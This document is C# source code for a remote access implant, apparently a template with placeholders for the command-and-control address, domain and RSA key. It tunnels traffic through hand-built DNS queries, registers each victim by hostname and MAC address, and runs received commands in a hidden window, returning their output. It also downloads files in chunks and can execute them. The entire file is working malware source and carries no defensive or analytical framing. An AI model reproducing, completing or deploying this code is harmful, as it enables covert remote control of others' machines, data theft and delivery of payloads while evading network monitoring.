using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Implant
{
    static class Config
    {
        internal static readonly bool Recursive = %%RECURVISE_MODE%%;
        internal static readonly string Ip =  %%IP_ADDRESS%%;
        internal static readonly int Port = %%PORT%%;
        internal static readonly string Domain = %%DOMAIN%%;
        internal static readonly string RsaKey = "<RSAKeyValue><Modulus>%%MODULUS%%</Modulus><Exponent>%%EXPONENT%%</Exponent></RSAKeyValue>";
        internal static readonly int NumberOfQueries = 1;
        internal static readonly int NumberExtraQueries = 3;
        internal static readonly int LabelsLength = 63;
        internal static readonly int TimeToWait = %%POLLING_INTERVAL%%;
        internal static readonly int ResponseHeaderLength = 11;
        internal static readonly int ConnectionTimeout = 20000;
    }

    static class Const
    {
        internal const int MaxLabelsLength = 63;
        internal const int DataPerPacket = 441; 
        internal const int QuerySize = 249;
        internal const string Polling = "p";
        internal const string Key = "k";
        internal const string Register = "c";
        internal const string Error = "e";
        internal const string Result = "r";
        internal const string File = "f";
        internal const string FileChunk = "fc";
        internal const string FileTransmissionError = "fte";
        internal const string FileName = "fn";
        internal const string FileSavingError = "fse";
        internal const string Exit = "terminate";
        internal const string Ok = "ok";
        internal const string NothingToDo = "n";
        internal const string H = "H:";
        internal const string C = ";C:";
        internal const string R = ";R:";
        internal const string T = "T";
        internal const string F = "F";
        internal const string RandomSubdomain = "www";
    }

    class Program
    {
        private static int Id { get; set; }
        private static FileTransmission IncomingFile { get; set; }
        private static DNSModule Dest { get; set; }
        private static Timer _timer;
        private static byte[] _key;
        private static readonly System.Threading.ManualResetEventSlim _waitLock = new System.Threading.ManualResetEventSlim();


        static void Main(string[] args)
        {
            var domain = Config.Domain;
            if (!domain.StartsWith("."))
            {
                domain = "." + domain;
            }
            Dest = new DNSModule(Config.Ip, Config.Port, domain, Config.Recursive);

		Task.Factory.StartNew(() =>
            {
                Registration();
                
            }, TaskCreationOptions.LongRunning);

            // wait until the exit command is invoked
            
            
            _waitLock.Wait();
	    
        }
        static void Registration()
        {
            var confirmationID = -1;
            byte[] generatedKey;
            using (var sessionKey = new RijndaelManaged())
            {
                sessionKey.GenerateKey();
                generatedKey = sessionKey.Key;
            }
                
            while (confirmationID == -1)
            {
                _key = null;
                while (_key == null)
                {
                    if (SetKey(generatedKey))
                        _key = generatedKey;
                }
                confirmationID = Register();
                Id = confirmationID;
            }
	Start();

        }

        static void Start()
        {

            InitTimer();
            //_timer.Start();
            _timer.Enabled = true;
            new System.Threading.ManualResetEvent(false).WaitOne();
        }

        private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            _timer.Enabled = false;
            var nextMessage = GetNextCommand();
            if (nextMessage != null)
            {
                nextMessage.Command = nextMessage.Command.Trim();
                if (nextMessage.Command == Const.Register || nextMessage.Command == Const.Error)
                {
		    _timer.Enabled = false;
                    Registration();
                }
                else
                {
                    ParseCommand(nextMessage);
                }

            }
            _timer.Enabled = true;
        }



        private static void ParseCommand(Message nextMessage)
        {
            var command = nextMessage.DecryptedCommand(_key);
            if (!String.IsNullOrEmpty(command))
            {
                switch (command)
                {
                    case Const.NothingToDo:
                        break;
                    case Const.File:
                        IncomingFile = new FileTransmission();
                        var fileArgsSplit = nextMessage.DecryptedResult(_key).Split(new[] { '|' });
                        if (fileArgsSplit.Length > 6)
                        {
                            IncomingFile.FileID = fileArgsSplit[0];
                            IncomingFile.Chunks = Convert.ToInt32(fileArgsSplit[1]);
                            IncomingFile.FileHash = fileArgsSplit[2];
                            IncomingFile.LocalPath = fileArgsSplit[3];
                            IncomingFile.Turbo = fileArgsSplit[4];
                            IncomingFile.Insecure = fileArgsSplit[5];
                            IncomingFile.Execute = fileArgsSplit[6];
                            IncomingFile.Started = true;
                            if (IncomingFile.LocalPath == "NEXT")
                            {
                                var fileName = new Message(Id, Const.FileName, IncomingFile.FileID);
                                var name = new Message(Dest.Send(fileName.AsEncryptedBase64string(_key)));
                                IncomingFile.LocalPath = name.DecryptedResult(_key);

                            }

                            Message fresponse = new Message(Id, Const.File, IncomingFile.FileID);
                            Message nextChunk = new Message(Dest.Send(fresponse.AsEncryptedBase64string(_key)));
                            ParseCommand(nextChunk);
                           
                            
                        }
                        break;  

                    case Const.FileChunk:
                        if (IncomingFile.Started)
                        {
                            if (!IncomingFile.IsCompleted())
                            {
                                if (IncomingFile.Insecure == Const.T)
                                {
                                    IncomingFile.AddChunk(System.Convert.FromBase64String(nextMessage.Result));
                                }
                                else
                                {
                                    IncomingFile.AddChunk(System.Convert.FromBase64String(nextMessage.DecryptedResult(_key)));
                                }
                                if (!IncomingFile.IsCompleted())
                                {

                                    var readyForFile = new Message(Id, Const.FileChunk, IncomingFile.FileID + "|" + IncomingFile.CurrentChunk.ToString());
                                    if (IncomingFile.Turbo != Const.T) System.Threading.Thread.Sleep(Config.TimeToWait);
                                    var sendNextChunk = new Message(Dest.Send(readyForFile.AsEncryptedBase64string(_key)));
                                    ParseCommand(sendNextChunk);
                                }

                            }


                            if (IncomingFile.IsCompleted())
                            {
                                var hash = CheckMD5(IncomingFile.Content.ToArray());
                                if (hash != IncomingFile.FileHash)
                                {
                                    var retryFile = new Message(Id, Const.FileTransmissionError, IncomingFile.FileID);
                                    Dest.Send(retryFile.AsEncryptedBase64string(_key));

                                }
                                else
                                {
                                    IncomingFile.Started = false;
                                    try
                                    {
                                        string path;
                                        if (!IncomingFile.LocalPath.Contains(Path.DirectorySeparatorChar.ToString()))
                                        {
                                            // TODO: verificare se funzia :)
                                            path = Path.Combine(Directory.GetCurrentDirectory(), IncomingFile.LocalPath);
                                            //path = Directory.GetCurrentDirectory() + Path.DirectorySeparatorChar + FileT.Local_path;
                                        }
                                        else path = IncomingFile.LocalPath;
                                        File.WriteAllBytes(path, IncomingFile.Content.ToArray());
                                        var fileCompleted = new Message(Id, Const.Ok, IncomingFile.FileID);
                                        Dest.Send(fileCompleted.AsEncryptedBase64string(_key));
                                        if (IncomingFile.Execute == Const.T) RunExternalExe(path);
                                        IncomingFile = null;


                                    }
                                    catch
                                    {
                                        var savingError = new Message(Id, Const.FileSavingError, IncomingFile.FileID);
                                        Dest.Send(savingError.AsEncryptedBase64string(_key));

                                    }


                                }

                            }

                        }
                        break;

                    case Const.Exit:
                        _waitLock.Set();
                        break;

                    default:
                        //exec command and send response back  
                        var executionArguments = command.Split(new[] { ' ' });
                        var filename = executionArguments[0]; //workaround as overload doesn't work
                                                              //string cmd = nextMessage.DecryptedCommand(Key);
                        string result;
                        if (executionArguments.Length > 1)
                        {
                            var args = command.Remove(0, filename.Length + 1);
                            result = RunExternalExe(filename, args);

                        }
                        else
                        {
                            result = RunExternalExe(filename);
                        }

                        var commandOutput = new Message(Id, Const.Result + "=" + command, result);
                        Dest.Send(commandOutput.AsEncryptedBase64string(_key));
                        break;


                }
            }
        }

        private static void InitTimer()
        {
            _timer = new Timer
            {
                Interval = Config.TimeToWait
            };
            _timer.Elapsed += OnTimedEvent;
            _timer.AutoReset = true;


        }
        private static Message GetNextCommand()
        {

            var polling = new Message(Id, Const.Polling, string.Empty);
            var responseString = Dest.Send(polling.AsEncryptedBase64string(_key));
            if (!String.IsNullOrEmpty(responseString))
            {
                var response = new Message(responseString);
                return response;
            }
            else return null;
        }


        private static string CheckMD5(byte[] fileContent)
        {
            byte[] hash;
            using (var md5 = MD5.Create())
            {
                hash = md5.ComputeHash(fileContent);
            }

            return BitConverter.ToString(hash).Replace("-", String.Empty).ToLowerInvariant();
        }




        private static Boolean SetKey(byte[] sessionKey)
        {
            var responseString = string.Empty;
            byte[] encryptedKey;
            bool confirmation;
            using (var serverRSA = new RSACryptoServiceProvider())
            {
                serverRSA.FromXmlString(Config.RsaKey);
                encryptedKey = serverRSA.Encrypt(sessionKey, true);
            }
                
            var encryptedSessionKey = System.Convert.ToBase64String(encryptedKey);
            var registration = new Message(0, Const.Key, encryptedSessionKey);
            var b64registration = registration.AsBase64string();
            {
                try
                {
                    while (String.IsNullOrEmpty(responseString))
                    {
                        responseString = Dest.Send(b64registration, 0);
                        
                    }
                    var response = new Message(responseString);
                    confirmation = response.Decrypt(sessionKey);
                    if (confirmation)
                        Id = response.Id;

                }
                catch
                {
                    return false;

                }
            }


            return true;

        }











        private static int Register()
        {
            var hostName = Environment.MachineName;
           var MACAddress = GetMacAddresses();
            var registration = new Message(Id, Const.Register, String.Concat(hostName,"|",MACAddress));
            var responseString = string.Empty;
            while (responseString == string.Empty)
            {
                responseString = Dest.Send(registration.AsEncryptedBase64string(_key));
                System.Threading.Thread.Sleep(Config.TimeToWait);
            }
            var response = new Message(responseString);
            return response.Id;
        }

        private static string GetMacAddresses()
        {
            byte[] mac;
            var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

            foreach (NetworkInterface networkInterface in networkInterfaces)
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    mac = networkInterface.GetPhysicalAddress().GetAddressBytes();
                    if (mac?.Length > 0)
                    {
                        return BitConverter.ToString(mac).Replace("-", String.Empty).ToLowerInvariant();

                    }
                }
            }
            return String.Empty;
        }

        private static string RunExternalExe(string fileName, string arguments = null)
        {
            using (var process = new System.Diagnostics.Process())
            {
                process.StartInfo.FileName = fileName;
                if (!string.IsNullOrEmpty(arguments))
                {
                    process.StartInfo.Arguments = arguments;
                }

                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                process.StartInfo.UseShellExecute = false;

                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.RedirectStandardOutput = true;
                var stdOutput = new StringBuilder();
                process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data); // Use AppendLine rather than Append since args.Data is one line of output, not including the newline character.
                var notEncoded = string.Empty;
                var stdError = string.Empty;
                try
                {
                    process.Start();
                    process.BeginOutputReadLine();
                    stdError = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                }
                catch (Exception e)
                {
                    notEncoded = e.Message;
                    return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(notEncoded));
                }
                if (stdError.Length > 0)
                {

                    notEncoded = stdError.ToString();
                }
                else
                {
                    notEncoded = stdOutput.ToString();
                }
                return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(notEncoded));
            }

                
        }





    }

    class FileTransmission
    {
        public string FileID { get; set; }
        public int Chunks { get; set; }
        public int CurrentChunk { get; set; }
        public string FileHash { get; set; }
        public string LocalPath { get; set; }
        public string Turbo { get; set; }
        public string Insecure { get; set; }
        public Boolean Started { get; set; }
        public List<byte> Content { get; set; }
        public string Execute { get; internal set; }

        public FileTransmission()
        {
            this.FileID = string.Empty;
            this.Chunks = 0;
            this.CurrentChunk = 0;
            this.FileHash = string.Empty;
            this.LocalPath = string.Empty;
            this.Turbo = string.Empty;
            this.Insecure = string.Empty;
            this.Execute = string.Empty;
            this.Started = false;
            this.Content = new List<byte>();

        }
        public Boolean IsCompleted()
        {

            return (CurrentChunk == Chunks);
        }

        public void AddChunk(byte[] chunk)
        {
            this.Content.AddRange(chunk);
            this.CurrentChunk++;
        }
        public string ContentAsString()
        {
            ASCIIEncoding encoding = new ASCIIEncoding();
            return encoding.GetString(this.Content.ToArray());
        }


    }
    class Message
    {

        public string Command { get; set; }
        public string Result { get; set; }
        public int Id { get; set; }

        public Message(int id, string command, string result)
        {

            this.Id = id;
            this.Command = command;
            this.Result = result;
        }

        public Message(string encodedContent)
        {
            try
            {
                var decodedContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedContent));
                var fields = decodedContent.Split(new[] { ';' });
                if (fields.Length == 4)
                {
                    var host_id = fields[0].Split(new[] { ':' })[1];
                    var command = fields[1].Split(new[] { ':' })[1];
                    var result = fields[2].Split(new[] { ':' })[1];

                    Id = Int32.Parse(host_id);
                    this.Command = command;
                    this.Result = result;


                }

            }
            catch
            {
                this.Id = 0;
                this.Command = string.Empty;
                this.Result = string.Empty;

            }


        }


        public string AsBase64string()
        {

            return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Const.H + this.Id.ToString() + Const.C + this.Command + Const.R + this.Result));
        }

        public string AsEncryptedBase64string(byte[] Key)
        {


            return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Const.H + this.Id.ToString() + Const.C + EncryptString(this.Command, Key) + Const.R + EncryptString(this.Result, Key)));
        }

        public bool Decrypt(byte[] Key)
        {
            try
            {
                using (SymmetricAlgorithm AESCipher = Aes.Create())
                {
                    AESCipher.Mode = System.Security.Cryptography.CipherMode.CBC;
                    AESCipher.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                    AESCipher.Key = Key;
                    if (!String.IsNullOrEmpty(this.Command))
                    {
                        var command = this.Command.Split(new[] { '%' });
                        //decrypt command
                        if (command.Length > 1)
                        {
                            AESCipher.IV = Convert.FromBase64String(command[1]);
                            using (ICryptoTransform decryptor = AESCipher.CreateDecryptor(AESCipher.Key, AESCipher.IV))
                            {
                                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(command[0])))
                                {
                                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                                    {
                                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                                        {
                                            this.Command = srDecrypt.ReadToEnd();


                                        }

                                    }

                                }

                            }
                        }
                    }

                    if (!String.IsNullOrEmpty(this.Result))
                    {
                        var result = this.Result.Split(new[] { '%' });
                        //decrypt result
                        if (result.Length > 1)
                        {
                            
                            AESCipher.IV = Convert.FromBase64String(result[1]);
                            using (ICryptoTransform decryptor = AESCipher.CreateDecryptor(AESCipher.Key, AESCipher.IV))
                            {
                                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(result[0])))
                                {
                                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                                    {
                                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                                        {
                                            this.Result = srDecrypt.ReadToEnd();


                                        }

                                    }

                                }

                            }

                        }
                    }

                    return true;
                }
                    

            }
            catch
            {
                return false;
            }

        }

        public string DecryptedCommand(byte[] Key)
        {
            using (SymmetricAlgorithm AESCipher = Aes.Create())
            {
                AESCipher.Mode = System.Security.Cryptography.CipherMode.CBC;
                AESCipher.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                AESCipher.Key = Key;
                var decrypted = string.Empty;
                try
                {
                    if (!String.IsNullOrWhiteSpace(this.Command))
                    {
                        var command = this.Command.Split(new[] { '%' });
                        //decrypt command
                        if (command.Length > 1)
                        {
                            AESCipher.IV = Convert.FromBase64String(command[1]);
                            using (ICryptoTransform decryptor = AESCipher.CreateDecryptor(AESCipher.Key, AESCipher.IV))
                            {
                                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(command[0])))
                                {
                                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                                    {
                                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                                        {
                                            decrypted = srDecrypt.ReadToEnd();

                                        }

                                    }

                                }

                            }
                        }
                    }
                }
                catch
                {
                    return string.Empty;
                }
                return decrypted;
            }
                
        }


        public string DecryptedResult(byte[] Key)
        {
            using (SymmetricAlgorithm AESCipher = Aes.Create())
            {
                AESCipher.Mode = System.Security.Cryptography.CipherMode.CBC;
                AESCipher.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                AESCipher.Key = Key;
                var decrypted = string.Empty;
                try
                {
                    if (!String.IsNullOrWhiteSpace(this.Result))
                    {
                        var result = this.Result.Split(new[] { '%' });
                        //decrypt command
                        if (result.Length > 1)
                        {
                            AESCipher.IV = Convert.FromBase64String(result[1]);
                            using (ICryptoTransform decryptor = AESCipher.CreateDecryptor(AESCipher.Key, AESCipher.IV))
                            {
                                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(result[0])))
                                {
                                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                                    {
                                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                                        {
                                            decrypted = srDecrypt.ReadToEnd();

                                        }

                                    }

                                }

                            }
                        }
                    }
                }
                catch
                {
                    return string.Empty;
                }
                return decrypted;
            }
                
        }

        static string EncryptString(string plainText, byte[] Key)
        {
            byte[] encrypted;
            var result = String.Empty;
            if (String.IsNullOrEmpty(plainText))
                return plainText;
            try
            {
                using (SymmetricAlgorithm AESCipher = Aes.Create())
                {
                    AESCipher.Mode = System.Security.Cryptography.CipherMode.CBC;
                    AESCipher.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                    AESCipher.Key = Key;
                    using (ICryptoTransform encryptor = AESCipher.CreateEncryptor(AESCipher.Key, AESCipher.IV))
                    {
                        using (var msEncrypt = new MemoryStream())
                        {
                            using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                            {
                                using (var swEncrypt = new StreamWriter(csEncrypt))
                                {
                                    swEncrypt.Write(plainText);

                                }
                            }
                            encrypted = msEncrypt.ToArray();
                        }
                    }

                    
                    result = Convert.ToBase64String(encrypted) + "%" + Convert.ToBase64String(AESCipher.IV);
                }
                    
            }
            catch
            {
                return string.Empty;
            }
            return result;

        }

    }

    class DNSModule
    {


        public DNSModule(string serverAddress, int serverPort, string dnsDomain, bool recursiveMode)
        {
            this.SD = dnsDomain;
            this.SP = serverPort;
            this.IDs = GetNextID();
            if (recursiveMode)
            {
                this.Recursive = true;
                this.SA = GetDnsAddress();
            }
            else
            {
                this.Recursive = false;
                this.SA = serverAddress;
            }
        }


        public string SA { get; }
        public int SP { get; }
        public string SD { get; }
        public byte IDs { get; set; }
        public bool Recursive { get; set; }

        private static string GetDnsAddress()
        {
            NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

            foreach (NetworkInterface networkInterface in networkInterfaces)
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties ipProperties = networkInterface.GetIPProperties();
                    IPAddressCollection dnsAddresses = ipProperties.DnsAddresses;

                    foreach (System.Net.IPAddress dnsAddress in dnsAddresses)
                    {
                        return dnsAddress.ToString();
                    }
                }
            }

            return string.Empty;


        }

        public string Send(string content, int Id = 1)
        {

            if (Id == 0)
                this.IDs = 0;
            else
                GetNextID();
            var queryLength = (Config.NumberExtraQueries + 1) * Config.LabelsLength;
            var maxQueryLength = queryLength > Const.QuerySize ? Const.QuerySize : queryLength;
            var resultingPacketLength = maxQueryLength * Config.NumberOfQueries;
            var totalPacketLength = resultingPacketLength > Const.DataPerPacket ? Const.DataPerPacket : resultingPacketLength;
            var informationInPacket = totalPacketLength - (4 * Config.NumberOfQueries);
            if (this.Recursive)
                informationInPacket -= (Config.Domain.Length * Config.NumberOfQueries);

            var contentLength = (double)content.Length;
            var maxInfoPerPacketLenght = (double)informationInPacket;

            var len = contentLength / maxInfoPerPacketLenght;          //number of total packets 
            var extraPackets = (int)Math.Ceiling(len) - 1;           //number of packets other than the first rounded (starting at zero)

            byte n;
            for (byte i = 0; i < extraPackets; i++)
            {
                n = (byte)(i + 1);
                Packet(this.IDs.ToString("X2") + n.ToString("X2") + content.Substring(i * informationInPacket, informationInPacket), maxQueryLength, false);
                System.Threading.Thread.Sleep(Config.TimeToWait);            //this to reduce the threshold
            }
            //last packet           
            var response = Packet(this.IDs.ToString("X2") + "00" + content.Substring(extraPackets * informationInPacket), maxQueryLength, true);
            if (response.Length > 3)
            {
                if (response[3] == 0x80)
                    return Parse(response);
            }
            return null;


        }



        private string Parse(byte[] response)
        {
            byte[] serverResponse = new byte[0];
            int len = response.Length;
            if (len > Config.ResponseHeaderLength)
            {     //else malformed packet
                if (response[3] == 128)
                {
                    //int n_answers = response[7];
                    int bytesToSkip = response[12] + 12;
                    int nextToSkip = bytesToSkip + response[bytesToSkip + 1] + 1;
                    while (response[nextToSkip] != 0)
                    {
                        nextToSkip++;
                        if (nextToSkip < response.Length)
                            nextToSkip += response[nextToSkip];
                    }
                    int resp_len = nextToSkip + 18;
                    serverResponse = new byte[response.Length - resp_len];
                    for (int i = resp_len; i < response.Length; i++)
                    {
                        serverResponse[i - resp_len] = response[i];
                    }
                }

            }
            return (System.Text.Encoding.UTF8.GetString(serverResponse));

        }


        private byte[] Packet(string onePacketContent, int maxQueryLength, bool last)
        {
            var packet = new byte[512];
            int n;
            var availableQueryLength = maxQueryLength;
            int endOfFirstSubstring;
            var twoQueries = false;

            this.PadPacket1(ref packet);


            if (this.Recursive) availableQueryLength -= Config.Domain.Length;
            if (onePacketContent.Length > availableQueryLength)
            {

                packet[5] = 0x02;
                endOfFirstSubstring = availableQueryLength;
                twoQueries = true;
            }
            else
            {
                packet[5] = 0x01;
                endOfFirstSubstring = onePacketContent.Length;
            }

            this.PadPacket2(ref packet);                                                          //set various flags to 0
            n = 12;
            //first query            
            n = CreateQuery(onePacketContent.Substring(0, endOfFirstSubstring), ref packet, n, 1, last);

            //second query
            if (twoQueries) n += CreateQuery(onePacketContent.Substring(endOfFirstSubstring), ref packet, n + endOfFirstSubstring + this.SD.Length + 5, 2, last);

            return Send(packet, n, last);
        }



        private int CreateQuery(string content, ref byte[] packet, int byteCount, int queryNumber, bool last)
        {
            var queryLength = 0;
            var labelSize = Config.LabelsLength > Const.MaxLabelsLength ? Const.MaxLabelsLength : Config.LabelsLength;
            var contentLength = (double)content.Length;
            var numberOfLabels = contentLength / (double)labelSize;
            var extraLabels = (int)Math.Ceiling(numberOfLabels) - 1;
            var charsCount = byteCount;
            for (int i = 0; i < extraLabels; i++)
            {
                packet[charsCount] = (byte)labelSize;
                charsCount++;
                AddCharsToPackets(content.Substring(i * labelSize, labelSize), ref packet, charsCount);
                charsCount += labelSize;
            }
            //last label
            var labelLength = (Config.NumberExtraQueries + 1) * Config.LabelsLength;
            var maxSize = labelLength > Const.QuerySize ? Const.QuerySize : labelLength;
            queryLength = content.Length > (maxSize) ? (maxSize) : content.Length;
            if (queryNumber == 2)
                queryLength = content.Length;// 
            var lastLabelLength = queryLength - (extraLabels * labelSize);
            packet[charsCount] = (byte)lastLabelLength;
            charsCount++;
            AddCharsToPackets(content.Substring(extraLabels * labelSize, lastLabelLength), ref packet, charsCount);
            charsCount += lastLabelLength;
            CloseQuery(ref packet, charsCount, last);
            charsCount += this.SD.Length + 5;
            return charsCount;

        }

        private void AddCharsToPackets(string chars, ref byte[] packet, int count)
        {
            for (int i = 0; i < chars.Length; i++)
            {
                packet[i + count] = (byte)chars[i];
            }
        }

        private void CloseQuery(ref byte[] packet, int byteCount, bool last)
        {
            if (this.Recursive)
            {
                var domain = new byte[256];
                var c = 0;
                for (int i = this.SD.Length; i > 0; i--)
                {

                    var t = this.SD[i - 1];
                    byte b;
                    if (t.Equals('.'))
                    {
                        b = (byte)c;
                        c = 0;
                    }
                    else
                    {
                        b = (byte)t;
                        c++;
                    }
                    domain[i - 1] = b;
                }

                for (int i = 0; i < this.SD.Length; i++)
                {
                    packet[byteCount+i] = domain[i];
                }
            }

            packet[byteCount+this.SD.Length] = 0x00;
            if (last)
            {
                packet[byteCount+this.SD.Length+1] = 0x10;
            }
            else
            {
                packet[byteCount+this.SD.Length+1] = 0x01;
            }

            packet[byteCount+this.SD.Length+2] = 0x00;
            packet[byteCount+this.SD.Length+3] = 0x01;
        }

        private void PadPacket1(ref byte[] packet)
        {
            Random rnd = new Random();
            byte[] transactionID = new byte[2];
            rnd.NextBytes(transactionID);
            packet[0] = transactionID[0];
            packet[1] = transactionID[1];
            packet[2] = 0x01;
            packet[3] = 0x00;
            packet[4] = 0x00;
        }

        private void PadPacket2(ref byte[] packet)
        {
            packet[6] = 0x00;
            packet[7] = 0x00;
            packet[8] = 0x00;
            packet[9] = 0x00;
            packet[10] = 0x00;
            packet[11] = 0x00;
        }

        private byte[] Send(byte[] packet, int byte_count, bool waitForResponse)
        {
            try
            {
                using (var c = new UdpClient())
                {
                    byte[] response = null;
                    c.Client.ReceiveTimeout = Config.ConnectionTimeout;
                    c.Connect(this.SA, this.SP);
                    c.Send(packet, byte_count);
                    if (waitForResponse)
                    {
                        var sal = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(this.SA), this.SP);
                        response = c.Receive(ref sal);
                        sal = null;
                    }

                    return response;
                }
            }
            catch (SocketException)
            {
                return System.Text.Encoding.UTF8.GetBytes(string.Empty);
            }
            catch (Exception)
            {
                return System.Text.Encoding.UTF8.GetBytes(string.Empty);
            }
        }

        private byte GetNextID()
        {
            if (this.IDs < 255)
            {
                this.IDs++;
            }
            else 
            { 
                this.IDs = 1; 
            }

            return this.IDs;
        }
    }
}
